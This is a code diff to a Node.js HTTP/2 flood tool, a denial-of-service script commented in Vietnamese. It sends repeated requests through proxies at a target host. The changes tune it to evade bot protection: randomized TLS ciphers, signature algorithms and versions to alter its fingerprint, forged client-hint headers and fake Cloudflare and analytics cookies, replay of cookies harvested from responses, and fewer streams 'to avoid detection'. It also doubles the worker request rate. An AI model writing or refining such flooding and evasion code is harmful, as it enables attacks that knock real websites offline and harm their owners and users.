@@ -107,15 +107,18 @@ const sec_ch_ua_full_version = [
     '"18.1.0"',
     '"129.0.2792.79"'
 ];
+const platform_versions = [
+    "10.0.0", "14.7.1", "15.0.0", "18.1.0"
+];
+const device_memory = ["4", "8", "16"];
+const hardware_concurrency = ["4", "8", "12", "16"];
 
+// Tăng tính ngẫu nhiên của ciphers
 const ciphers = [
-    "TLS_AES_128_GCM_SHA256",
-    "TLS_AES_256_GCM_SHA384",
-    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
-    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
-    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
-].join(":");
+    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
+    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256",
+    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_AES_256_GCM_SHA384"
+];
 
 const proxies = readLines(args.proxyFile);
 
@@ -125,7 +128,7 @@ if (cluster.isMaster) {
     }
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 50); // Giảm interval để tăng số request
 }
 
 class NetSocket {
@@ -178,9 +181,11 @@ function generateDynamicPath() {
         `page=${randomIntn(1, 20)}`,
         `token=${randstr(10)}`,
         `lang=${randomElement(['en', 'vi', 'zh', 'fr'])}`,
-        `category=${randstr(5)}`
+        `category=${randstr(5)}`,
+        `sort=${randomElement(['asc', 'desc'])}`,
+        `filter=${encodeURIComponent(randstr(4))}`
     ];
-    const queryCount = randomIntn(1, 3);
+    const queryCount = randomIntn(1, 4); // Tăng số lượng query để mô phỏng hành vi người dùng
     return `${basePath}?${queries.slice(0, queryCount).join('&')}`;
 }
 
@@ -201,7 +206,10 @@ function generateDynamicHeaders() {
         "sec-ch-ua": sec_ch_ua[uaIndex],
         "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
         "sec-ch-ua-platform": platforms[uaIndex % platforms.length],
+        "sec-ch-ua-platform-version": platform_versions[uaIndex % platform_versions.length],
         "sec-ch-ua-full-version-list": sec_ch_ua_full_version[uaIndex],
+        "sec-ch-device-memory": randomElement(device_memory),
+        "sec-ch-hardware-concurrency": randomElement(hardware_concurrency),
         "upgrade-insecure-requests": "1",
         "priority": randomElement(["u=0, i", "u=1"]),
         "cache-control": randomElement(cache_control),
@@ -210,12 +218,15 @@ function generateDynamicHeaders() {
         "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
         "sec-ch-viewport-width": randomIntn(800, 1920).toString()
     };
-    // Thêm cookie ngẫu nhiên để mô phỏng phiên người dùng
-    if (Math.random() > 0.5) {
-        headers["cookie"] = `__cfduid=${randstr(32)}; session=${randstr(16)}`;
+    // Thêm cookie động
+    if (Math.random() > 0.3) {
+        headers["cookie"] = `__cfduid=${randstr(43)}; session=${randstr(16)}; _ga=${randstr(20)}`;
     }
     return headers;
 }
+
+// Lưu trữ cookie từ response
+let sessionCookies = {};
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
@@ -226,7 +237,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 5 // Tăng timeout để xử lý proxy chậm
+        timeout: 10 // Tăng timeout để xử lý proxy chậm
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -238,13 +249,18 @@ function runFlooder() {
         const tlsOptions = {
             secure: true,
             ALPNProtocols: ['h2', 'http/1.1'],
-            ciphers: ciphers,
+            ciphers: randomElement(ciphers), // Ngẫu nhiên hóa ciphers
             host: parsedTarget.host,
             servername: parsedTarget.host,
             rejectUnauthorized: false,
-            minVersion: 'TLSv1.2',
+            minVersion: randomElement(['TLSv1.2', 'TLSv1.3']),
             maxVersion: 'TLSv1.3',
-            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1']) // Ngẫu nhiên hóa curve để cải thiện JA3
+            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1']),
+            sigalgs: randomElement([
+                "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
+                "ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384",
+                "rsa_pkcs1_sha256:rsa_pkcs1_sha384"
+            ])
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -254,7 +270,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 30, // Giảm xuống 25 để tránh bị phát hiện
+                maxConcurrentStreams: 20, // Giảm số lượng stream để tránh bị phát hiện
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536
             },
@@ -264,9 +280,17 @@ function runFlooder() {
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < Math.min(args.Rate, 12); i++) { // Giảm xuống 12 request mỗi chu kỳ
+                // Sử dụng cookie từ session trước nếu có
+                if (sessionCookies[parsedTarget.host]) {
+                    dynHeaders["cookie"] = sessionCookies[parsedTarget.host];
+                }
+                for (let i = 0; i < Math.min(args.Rate, 8); i++) { // Giảm xuống 8 request mỗi chu kỳ
                     const request = client.request(dynHeaders);
-                    request.on("response", () => {
+                    request.on("response", (headers) => {
+                        // Lưu cookie từ response
+                        if (headers['set-cookie']) {
+                            sessionCookies[parsedTarget.host] = headers['set-cookie'].join('; ');
+                        }
                         request.close();
                         request.destroy();
                     });
@@ -276,7 +300,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 100); // Tăng lên 150ms để giảm áp lực
+            }, 200); // Tăng interval để giảm áp lực
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
